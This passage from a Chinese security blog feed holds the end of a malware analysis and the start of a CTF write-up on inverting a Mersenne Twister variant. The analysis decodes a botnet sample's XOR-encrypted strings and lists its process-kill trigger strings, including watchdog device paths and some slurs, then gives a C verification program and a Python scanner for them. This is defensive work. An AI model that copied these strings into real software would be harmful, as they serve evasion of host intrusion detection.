class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x69</span>, <span class="number">0x6A</span>, </span><br><span class="line"><span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x4E</span>, <span class="number">0x4B</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, </span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x47</span>, <span class="number">0x41</span>, <span class="number">0x49</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0x61</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, </span><br><span class="line"><span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0x0D</span>, <span class="number">0x14</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x12</span>, <span class="number">0x0C</span>, <span class="number">0x11</span>, </span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#lsit1 = [&#x27;0&#x27;, &#x27;3&#x27;, &#x27;16&#x27;, &#x27;19&#x27;, &#x27;35&#x27;, &#x27;43&#x27;, &#x27;49&#x27;, &#x27;61&#x27;, &#x27;66&#x27;, &#x27;74&#x27;, &#x27;83&#x27;, &#x27;94&#x27;, &#x27;106&#x27;, &#x27;122&#x27;, &#x27;139&#x27;, &#x27;154&#x27;, &#x27;166&#x27;, &#x27;172&#x27;, &#x27;178&#x27;, &#x27;195&#x27;, &#x27;210&#x27;, &#x27;220&#x27;, &#x27;240&#x27;, &#x27;264&#x27;, &#x27;279&#x27;, &#x27;299&#x27;, &#x27;323&#x27;, &#x27;339&#x27;, &#x27;348&#x27;, &#x27;360&#x27;, &#x27;370&#x27;, &#x27;377&#x27;, &#x27;383&#x27;, &#x27;394&#x27;, &#x27;411&#x27;, &#x27;422&#x27;, &#x27;428&#x27;, &#x27;434&#x27;, &#x27;440&#x27;, &#x27;447&#x27;, &#x27;455&#x27;, &#x27;463&#x27;, &#x27;467&#x27;, &#x27;486&#x27;, &#x27;510&#x27;, &#x27;520&#x27;]</span></span><br><span class="line"><span class="comment">#list2 = [&#x27;2&#x27;, &#x27;12&#x27;, &#x27;2&#x27;, &#x27;29&#x27;, &#x27;7&#x27;, &#x27;5&#x27;, &#x27;11&#x27;, &#x27;4&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;10&#x27;, &#x27;11&#x27;, &#x27;15&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;11&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;16&#x27;, &#x27;14&#x27;, &#x27;9&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;14&#x27;, &#x27;19&#x27;, &#x27;23&#x27;, &#x27;15&#x27;, &#x27;8&#x27;, &#x27;11&#x27;, &#x27;9&#x27;, &#x27;6&#x27;, &#x27;5&#x27;, &#x27;10&#x27;, &#x27;15&#x27;, &#x27;10&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;7&#x27;, &#x27;3&#x27;, &#x27;18&#x27;, &#x27;23&#x27;, &#x27;9&#x27;, &#x27;16&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">msg_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> cipher1:</span><br><span class="line">char = <span class="built_in">chr</span>(_ ^ <span class="number">34</span>)</span><br><span class="line"><span class="keyword">if</span> char == <span class="string">&quot;\0&quot;</span>:</span><br><span class="line">msg_str = msg_str + <span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">msg_str = msg_str + char</span><br><span class="line">length = <span class="built_in">len</span>(list1)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">print(msg_str[<span class="built_in">int</span>(list1[_]):<span class="built_in">int</span>(list1[_])+<span class="built_in">int</span>(list2[_])])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">func1()</span><br></pre></td></tr></table></figure><p>这样就得到了表格每项的数据，再把源码的表格解密一下，两边的数据顺序大致上是对得上的<br />多余的部分基本上就是字符串KILL特征了，特征如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">dvrHelper\x00</span><br><span class="line">NiGGeR69xd\x00</span><br><span class="line">1337SoraLOADER\x00</span><br><span class="line">NiGGeRd0nks1337\x00</span><br><span class="line">X19I239124UIU\x00</span><br><span class="line">IuYgujeIqn\x00</span><br><span class="line">14Fa\x00</span><br><span class="line">ccAD\x00</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;route\x00</span><br><span class="line">&#x2F;proc&#x2F;cpuinfo\x00</span><br><span class="line">BOGOMIPS\x00</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.local\x00</span><br><span class="line">g1abc4dmo35hnp2lie0kjf\x00</span><br><span class="line">&#x2F;dev&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;misc&#x2F;watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;FTWDT101_watchdog\x00</span><br><span class="line">&#x2F;dev&#x2F;netslink&#x2F;\x00</span><br><span class="line">PRIVMSG\x00</span><br><span class="line">GETLOCALIP\x00</span><br><span class="line">KILLATTK\x00</span><br><span class="line">Eats8\x00</span><br><span class="line">v[0v\x00</span><br><span class="line">93OfjHZ2z\x00</span><br><span class="line">GhostWuzHere666</span><br><span class="line">WsGA4@F6F\x00</span><br><span class="line">ACDB\x00</span><br><span class="line">AbAd\x00</span><br><span class="line">iaGv\x00</span><br></pre></td></tr></table></figure><p>BTW：若出现<code>\x00</code>则为必要的，C语言程序中输出&quot;KEY{dvrHelper}&quot;不会触发KILL机制，输出&quot;dvrHelper&quot;则会</p><p>但是还是要验证一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">char</span> *res;</span><br><span class="line">system(<span class="string">&quot;xxd ./kill_me | grep dvr -A 1&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Kill_me_KEY is :dvrHelper&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m alive at &quot;</span>);</span><br><span class="line">fp = popen(<span class="string">&quot;date&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(fgets(res, <span class="keyword">sizeof</span>(res), fp) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, res);</span><br><span class="line">&#125;</span><br><span class="line">pclose(fp);</span><br><span class="line">sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照这样每个字符串都过一遍<br />可以确定上文部分的特征都为字符串KILL特征</p><h1 id="key_in_hids"><a class="markdownIt-Anchor" href="#key_in_hids"></a> KEY_in_HIDS</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">key = [</span><br><span class="line"><span class="string">&quot;dvrHelper&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeR69xd&quot;</span>, </span><br><span class="line"><span class="string">&quot;1337SoraLOADER&quot;</span>, </span><br><span class="line"><span class="string">&quot;NiGGeRd0nks1337&quot;</span>, </span><br><span class="line"><span class="string">&quot;X19I239124UIU&quot;</span>, </span><br><span class="line"><span class="string">&quot;IuYgujeIqn&quot;</span>, </span><br><span class="line"><span class="string">&quot;14Fa&quot;</span>, </span><br><span class="line"><span class="string">&quot;ccAD&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/net/route&quot;</span>, </span><br><span class="line"><span class="string">&quot;/proc/cpuinfo&quot;</span>, </span><br><span class="line"><span class="string">&quot;BOGOMIPS&quot;</span>, </span><br><span class="line"><span class="string">&quot;/etc/rc.d/rc.local&quot;</span>, </span><br><span class="line"><span class="string">&quot;g1abc4dmo35hnp2lie0kjf&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/misc/watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/FTWDT101_watchdog&quot;</span>, </span><br><span class="line"><span class="string">&quot;/dev/netslink/&quot;</span>, </span><br><span class="line"><span class="string">&quot;PRIVMSG&quot;</span>, </span><br><span class="line"><span class="string">&quot;GETLOCALIP&quot;</span>, </span><br><span class="line"><span class="string">&quot;KILLATTK&quot;</span>, </span><br><span class="line"><span class="string">&quot;Eats8&quot;</span>, </span><br><span class="line"><span class="string">&quot;v[0v&quot;</span>, </span><br><span class="line"><span class="string">&quot;93OfjHZ2z&quot;</span>, </span><br><span class="line"><span class="string">&quot;GhostWuzHere666&quot;</span>, </span><br><span class="line"><span class="string">&quot;WsGA4@F6F&quot;</span>, </span><br><span class="line"><span class="string">&quot;ACDB&quot;</span>, </span><br><span class="line"><span class="string">&quot;AbAd&quot;</span>, </span><br><span class="line"><span class="string">&quot;iaGv&quot;</span>]</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;/usr/local/[DATA_EXPUNGED]&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = binascii.hexlify(data).decode()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> key:</span><br><span class="line">hex_key = binascii.hexlify(_.encode()).decode()</span><br><span class="line">find_list = re.findall(hex_key, data)</span><br><span class="line"><span class="keyword">if</span> find_list != []:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>写份报告就能交差了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上班的时候被安排了个分析恶意样本的活&lt;br /&gt;
说是这个恶意样本会选择性地KILL进程，把公司开发的HIDS给KILL了&lt;br /&gt;
让我分析一下这个恶意样本的KILL机制以及KILL特征&lt;br /&gt;
&lt;s&gt;WEB手，但是干的或是恶意样本分析&lt;/s&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_MAY_2022</title>
    <link href="https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/"/>
    <id>https://yoloyolo.top/2022/05/21/DASCTF-MAY-2022/</id>
    <published>2022-05-21T14:11:59.000Z</published>
    <updated>2022-06-27T18:30:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>老样子，赛后解题</p><a id="more"></a><h1 id="yusa的密码学课堂一见如故"><a class="markdownIt-Anchor" href="#yusa的密码学课堂一见如故"></a> Yusa的密码学课堂——一见如故</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myrand</span>():</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,seed</span>):</span></span><br><span class="line">self.index = <span class="number">0</span></span><br><span class="line">self.isInit = <span class="number">1</span></span><br><span class="line">self.MT = [seed] + [<span class="number">0</span>] * <span class="number">623</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">t = <span class="number">1314433253</span> * (self.MT[i-<span class="number">1</span>] ^ (self.MT[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>)) + <span class="number">1</span></span><br><span class="line">self.MT[i] = t &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (self.MT[i] &amp; <span class="number">0x80000000</span>) + (self.MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">self.MT[i] = self.MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">self.MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rand</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span> self.index == <span class="number">0</span>:</span><br><span class="line">self.generate()</span><br><span class="line">y = self.MT[self.index]</span><br><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br><span class="line">self.index = (self.index + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">self, y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">r = Myrand(<span class="built_in">int</span>(os.urandom(<span class="number">4</span>).<span class="built_in">hex</span>(),<span class="number">16</span>))</span><br><span class="line">out = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">out.append(r.rand())</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(<span class="built_in">str</span>(out))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(r.rand()).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><ul><li>函数<code>__init__(self,seed)</code>用于初始化</li><li>函数<code>rand(self)</code>为主要函数</li><li>函数<code>generate(self)</code>用于当<code>index</code>为0时重新生成列表<code>MT</code></li><li>函数<code>cs2l(self, y, shift)</code>用于将<code>y</code>按bit循环左移<code>shift</code>位</li><li>函数<code>cs2r(self, y, shift)</code>用于将<code>y</code>按bit循环右移<code>shift</code>位</li></ul><p>由于是先生成了624个随机数，即遍历了一遍列表<code>MT</code>，再生成了flag<br />所以我们用给出的624个随机数逆推出列表<code>MT</code>的状态，再调用一下函数<code>generate(self)</code>，最后在生成一个随机数即可获得flag</p><p>此题的难点在于这两条语句的逆算法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = y ^ self.cs2l(y, <span class="number">11</span>) ^ self.cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ self.cs2r(y, <span class="number">7</span>) ^ self.cs2r(y, <span class="number">19</span>)</span><br></pre></td></tr></table></figure><p>先看第一条语句，产生的结果等价如下方程组<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>0</mn></msub><mo>=</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>1</mn></msub><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>2</mn></msub><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>3</mn></msub><mo>=</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>4</mn></msub><mo>=</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>5</mn></msub><mo>=</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>6</mn></msub><mo>=</mo><msub><mi>b</mi><mn>6</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>7</mn></msub><mo>=</mo><msub><mi>b</mi><mn>7</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>8</mn></msub><mo>=</mo><msub><mi>b</mi><mn>8</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>9</mn></msub><mo>=</mo><msub><mi>b</mi><mn>9</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>10</mn></msub><mo>=</mo><msub><mi>b</mi><mn>10</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>11</mn></msub><mo>=</mo><msub><mi>b</mi><mn>11</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>12</mn></msub><mo>=</mo><msub><mi>b</mi><mn>12</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>13</mn></msub><mo>=</mo><msub><mi>b</mi><mn>13</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>14</mn></msub><mo>=</mo><msub><mi>b</mi><mn>14</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>15</mn></msub><mo>=</mo><msub><mi>b</mi><mn>15</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>16</mn></msub><mo>=</mo><msub><mi>b</mi><mn>16</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>27</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>17</mn></msub><mo>=</mo><msub><mi>b</mi><mn>17</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>28</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>18</mn></msub><mo>=</mo><msub><mi>b</mi><mn>18</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>29</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>19</mn></msub><mo>=</mo><msub><mi>b</mi><mn>19</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>30</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>20</mn></msub><mo>=</mo><msub><mi>b</mi><mn>20</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>31</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>21</mn></msub><mo>=</mo><msub><mi>b</mi><mn>21</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>0</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>22</mn></msub><mo>=</mo><msub><mi>b</mi><mn>22</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>1</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>23</mn></msub><mo>=</mo><msub><mi>b</mi><mn>23</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>2</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>6</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>24</mn></msub><mo>=</mo><msub><mi>b</mi><mn>24</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>3</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>7</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>25</mn></msub><mo>=</mo><msub><mi>b</mi><mn>25</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>4</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>8</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mi>a</mi><mn>26</mn></msub><mo>=</mo><msub><mi>b</mi><mn>26</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>5</mn></msub><mo>⊕</mo><msub><mi>b</mi><mn>9</mn></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" 